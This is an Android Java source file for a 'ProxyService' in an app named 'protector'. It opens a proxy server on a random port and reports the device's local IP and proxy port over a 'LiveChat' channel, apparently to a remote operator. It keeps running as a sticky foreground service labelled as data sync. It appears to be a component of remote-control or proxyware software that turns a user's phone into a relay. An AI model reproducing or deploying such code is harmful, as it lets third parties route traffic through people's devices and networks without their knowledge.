package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.getdeviceIpAddress;
import static com.icontrol.protector.UtliTools.isPortInUse;
import static com.icontrol.protector.UtliTools.randomnumber;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ProxyService extends Service {

    private ExecutorService executorService;
    private MyProxy proxyServer;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start the proxy server in a background thread
        Context ctx = getApplicationContext();
        executorService = Executors.newSingleThreadExecutor();
        executorService.execute(() -> {
            try {

                int port = 7931;
                do {
                    port = randomnumber(2000,9000);
                }while (isPortInUse(port));
                proxyServer = new MyProxy(port); // You can choose any port
                MyLoger.Debug("ProxyService", "Proxy server started on port "+port);

                String localip = getdeviceIpAddress();
                MyLoger.Debug("ProxyService", "localip "+localip);


                JSONObject message = new JSONObject();
                message.put("ctype", "first");//call type
                message.put("loip", localip);
                message.put("pport", port);

                LiveChat.instance(ctx).ProxyMsg(ctx,message);

                proxyServer.start( ctx);

            } catch (Exception e) {
                MyLoger.Error("ProxyService", "Error starting proxy server"+ e.getMessage());
                e.printStackTrace();
                try{
                    JSONObject message = new JSONObject();
                    message.put("ctype", "state");//call type
                    message.put("smsg", "Error: "+e.getMessage());

                    LiveChat.instance(ctx).ProxyMsg(ctx,message);
                }catch (Exception a){
                    a.printStackTrace();
                }
            }
        });

        // Start the service in the foreground to avoid being killed
        startforground(getApplicationContext());

        return START_STICKY;
    }

    private static int Notifi_ID = 111;
    private void startforground(Context ctx) {
        try{
           // int Notifi_ID = UtliTools.randomnumber(11111, 88888);
            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        }catch (Exception a){}


    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("ProxyService", "onDestroy  proxy server");
        // Stop the proxy server and shutdown the executor service
        if (proxyServer != null) {
            proxyServer.stop();
        }
        if (executorService != null) {
            executorService.shutdown();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


}

